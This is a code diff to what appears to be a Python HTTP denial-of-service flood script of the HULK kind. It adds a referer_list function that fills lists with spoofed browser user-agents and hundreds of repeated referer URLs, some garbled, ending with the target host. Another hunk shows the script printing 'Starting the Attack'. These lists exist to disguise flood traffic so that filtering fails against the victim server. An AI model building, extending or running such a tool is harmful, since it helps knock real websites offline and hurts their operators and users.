@@ -6042,6 +6042,239 @@ def useragent_list():
         "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
         " Firefox/3.5.3"
     )
+    return headers_useragents
+
+
+def referer_list():
+    global headers_referers
+    headers_useragents.append(
+        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
+        " Firefox/3.5.3"
+    )
+    headers_useragents.append(
+        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
+        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
+    )
+    headers_useragents.append(
+        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
+        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
+    )
+    headers_useragents.append(
+        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
+        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
+    )
+    headers_useragents.append(
+        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
+        " .NET4.0C; .NET4.0E"
+    )
+    headers_useragents.append(
+        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
+        " Gecko) Chrome/4.0.219.6 Safari/532.1"
+    )
+    headers_useragents.append(
+        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
+        " .NET CLR 2.0.50727; InfoPath.2)"
+    )
+    headers_useragents.append(
+        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
+    )
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..")
+    headers_referers.append("http://vk.com/profile.php?redirect=")
+    headers_referers.append("http://www.usatoday.com/search/results?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=query?=query=..")
+    headers_referers.append(
+        "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882"
+    )
+    headers_referers.append(
+        "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925"
+    )
+    headers_referers.append("http://yandex.ru/yandsearch?text=")
+    headers_referers.append(
+        "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832"
+    )
+    headers_referers.append("http://go.mail.ru/search?mail.ru=1&q=")
+    headers_referers.append("http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..")
+    headers_referers.append("http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..")
+    headers_referers.append("http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..")
+    headers_referers.append("http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..")
+    headers_referers.append("http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..")
+    headers_referers.append(
+        "/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882"
+    )
+    headers_referers.append("http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..")
+    headers_referers.append("http://www.google.ru/url?sa=t&rct=?j&q=&e..")
+    headers_referers.append("http://help.baidu.com/searchResult?keywords=")
+    headers_referers.append("http://www.bing.com/search?q=")
+    headers_referers.append("https://www.yandex.com/yandsearch?text=")
+    headers_referers.append("https://duckduckgo.com/?q=")
+    headers_referers.append("http://www.ask.com/web?q=")
+    headers_referers.append("http://search.aol.com/aol/search?q=")
+    headers_referers.append("https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=")
+    headers_referers.append("https://drive.google.com/viewerng/viewer?url=")
+    headers_referers.append("http://validator.w3.org/feed/check.cgi?url=")
+    headers_referers.append("http://host-tracker.com/check_page/?furl=")
+    headers_referers.append(
+        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL="
+    )
+    headers_referers.append("http://jigsaw.w3.org/css-validator/validator?uri=")
+    headers_referers.append("https://add.my.yahoo.com/rss?url=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.usatoday.com/search/results?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("https://steamcommunity.com/market/search?q=")
+    headers_referers.append("http://filehippo.com/search?q=")
+    headers_referers.append(
+        "http://www.topsiteminecraft.com/site/pinterest.com/search?q="
+    )
+    headers_referers.append("http://eu.battle.net/wow/en/search?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("http://careers.gatesfoundation.org/search?q=")
+    headers_referers.append("http://techtv.mit.edu/search?q=")
+    headers_referers.append("http://www.ustream.tv/search?q=")
+    headers_referers.append("http://www.ted.com/search?q=")
+    headers_referers.append("http://funnymama.com/search?q=")
+    headers_referers.append("http://itch.io/search?q=")
+    headers_referers.append("http://jobs.rbs.com/jobs/search?q=")
+    headers_referers.append("http://taginfo.openstreetmap.org/search?q=")
+    headers_referers.append("http://www.baoxaydung.com.vn/news/vn/search&q=")
+    headers_referers.append("https://play.google.com/store/search?q=")
+    headers_referers.append("http://www.tceq.texas.gov/@@tceq-search?q=")
+    headers_referers.append("http://www.reddit.com/search?q=")
+    headers_referers.append("http://www.bestbuytheater.com/events/search?q=")
+    headers_referers.append("https://careers.carolinashealthcare.org/search?q=")
+    headers_referers.append("http://jobs.leidos.com/search?q=")
+    headers_referers.append("http://jobs.bloomberg.com/search?q=")
+    headers_referers.append("https://www.pinterest.com/search/?q=")
+    headers_referers.append("http://millercenter.org/search?q=")
+    headers_referers.append("https://www.npmjs.com/search?q=")
+    headers_referers.append("http://www.evidence.nhs.uk/search?q=")
+    headers_referers.append("http://www.shodanhq.com/search?q=")
+    headers_referers.append("http://ytmnd.com/search?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.usatoday.com/search/results?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("https://steamcommunity.com/market/search?q=")
+    headers_referers.append("http://filehippo.com/search?q=")
+    headers_referers.append(
+        "http://www.topsiteminecraft.com/site/pinterest.com/search?q="
+    )
+    headers_referers.append("http://eu.battle.net/wow/en/search?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("http://careers.gatesfoundation.org/search?q=")
+    headers_referers.append("http://techtv.mit.edu/search?q=")
+    headers_referers.append("http://www.ustream.tv/search?q=")
+    headers_referers.append("http://www.ted.com/search?q=")
+    headers_referers.append("http://funnymama.com/search?q=")
+    headers_referers.append("http://itch.io/search?q=")
+    headers_referers.append("http://jobs.rbs.com/jobs/search?q=")
+    headers_referers.append("http://taginfo.openstreetmap.org/search?q=")
+    headers_referers.append("http://www.baoxaydung.com.vn/news/vn/search&q=")
+    headers_referers.append("https://play.google.com/store/search?q=")
+    headers_referers.append("http://www.tceq.texas.gov/@@tceq-search?q=")
+    headers_referers.append("http://www.reddit.com/search?q=")
+    headers_referers.append("http://www.bestbuytheater.com/events/search?q=")
+    headers_referers.append("https://careers.carolinashealthcare.org/search?q=")
+    headers_referers.append("http://jobs.leidos.com/search?q=")
+    headers_referers.append("http://jobs.bloomberg.com/search?q=")
+    headers_referers.append("https://www.pinterest.com/search/?q=")
+    headers_referers.append("http://millercenter.org/search?q=")
+    headers_referers.append("https://www.npmjs.com/search?q=")
+    headers_referers.append("http://www.evidence.nhs.uk/search?q=")
+    headers_referers.append("http://www.shodanhq.com/search?q=")
+    headers_referers.append("http://ytmnd.com/search?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.usatoday.com/search/results?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("https://steamcommunity.com/market/search?q=")
+    headers_referers.append("http://filehippo.com/search?q=")
+    headers_referers.append(
+        "http://www.topsiteminecraft.com/site/pinterest.com/search?q="
+    )
+    headers_referers.append("http://eu.battle.net/wow/en/search?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("http://careers.gatesfoundation.org/search?q=")
+    headers_referers.append("http://techtv.mit.edu/search?q=")
+    headers_referers.append("http://www.ustream.tv/search?q=")
+    headers_referers.append("http://www.ted.com/search?q=")
+    headers_referers.append("http://funnymama.com/search?q=")
+    headers_referers.append("http://itch.io/search?q=")
+    headers_referers.append("http://jobs.rbs.com/jobs/search?q=")
+    headers_referers.append("http://taginfo.openstreetmap.org/search?q=")
+    headers_referers.append("http://www.baoxaydung.com.vn/news/vn/search&q=")
+    headers_referers.append("https://play.google.com/store/search?q=")
+    headers_referers.append("http://www.tceq.texas.gov/@@tceq-search?q=")
+    headers_referers.append("http://www.reddit.com/search?q=")
+    headers_referers.append("http://www.bestbuytheater.com/events/search?q=")
+    headers_referers.append("https://careers.carolinashealthcare.org/search?q=")
+    headers_referers.append("http://jobs.leidos.com/search?q=")
+    headers_referers.append("http://jobs.bloomberg.com/search?q=")
+    headers_referers.append("https://www.pinterest.com/search/?q=")
+    headers_referers.append("http://millercenter.org/search?q=")
+    headers_referers.append("https://www.npmjs.com/search?q=")
+    headers_referers.append("http://www.evidence.nhs.uk/search?q=")
+    headers_referers.append("http://www.shodanhq.com/search?q=")
+    headers_referers.append("http://ytmnd.com/search?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.usatoday.com/search/results?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("https://steamcommunity.com/market/search?q=")
+    headers_referers.append("http://filehippo.com/search?q=")
+    headers_referers.append(
+        "http://www.topsiteminecraft.com/site/pinterest.com/search?q="
+    )
+    headers_referers.append("http://eu.battle.net/wow/en/search?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("http://careers.gatesfoundation.org/search?q=")
+    headers_referers.append("http://techtv.mit.edu/search?q=")
+    headers_referers.append("http://www.ustream.tv/search?q=")
+    headers_referers.append("http://www.ted.com/search?q=")
+    headers_referers.append("http://funnymama.com/search?q=")
+    headers_referers.append("http://itch.io/search?q=")
+    headers_referers.append("http://jobs.rbs.com/jobs/search?q=")
+    headers_referers.append("http://taginfo.openstreetmap.org/search?q=")
+    headers_referers.append("http://www.baoxaydung.com.vn/news/vn/search&q=")
+    headers_referers.append("https://play.google.com/store/search?q=")
+    headers_referers.append("http://www.tceq.texas.gov/@@tceq-search?q=")
+    headers_referers.append("http://www.reddit.com/search?q=")
+    headers_referers.append("http://www.bestbuytheater.com/events/search?q=")
+    headers_referers.append("https://careers.carolinashealthcare.org/search?q=")
+    headers_referers.append("http://jobs.leidos.com/search?q=")
+    headers_referers.append("http://jobs.bloomberg.com/search?q=")
+    headers_referers.append("https://www.pinterest.com/search/?q=")
+    headers_referers.append("http://millercenter.org/search?q=")
+    headers_referers.append("https://www.npmjs.com/search?q=")
+    headers_referers.append("http://www.evidence.nhs.uk/search?q=")
+    headers_referers.append("http://www.shodanhq.com/search?q=")
+    headers_referers.append("http://ytmnd.com/search?q=")
+    headers_referers.append(
+        "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u="
+    )
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append(
+        "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u="
+    )
+    headers_referers.append("https://drive.google.com/viewerng/viewer?url=")
+    headers_referers.append("http://www.google.com/translate?u=")
+    headers_referers.append(
+        "https://developers.google.com/speed/pagespeed/insights/?url="
+    )
+    headers_referers.append("http://help.baidu.com/searchResult?keywords=")
+    headers_referers.append("http://www.bing.com/search?q=")
+    headers_referers.append("https://add.my.yahoo.com/rss?url=")
+    headers_referers.append("https://play.google.com/store/search?q=")
+    headers_referers.append("http://www.google.com/?q=")
+    headers_referers.append("http://www.usatoday.com/search/results?q=")
+    headers_referers.append("http://engadget.search.aol.com/search?q=")
+    headers_referers.append("http://" + host + "/")
     return headers_referers
 
 
@@ -6136,7 +6369,6 @@ else:
         sys.exit()
     else:
         print("Starting the Attack")
-        print("ANONYMOUS")
         if len(sys.argv) == 3:
             if sys.argv[2] == "safe":
                 set_safe()
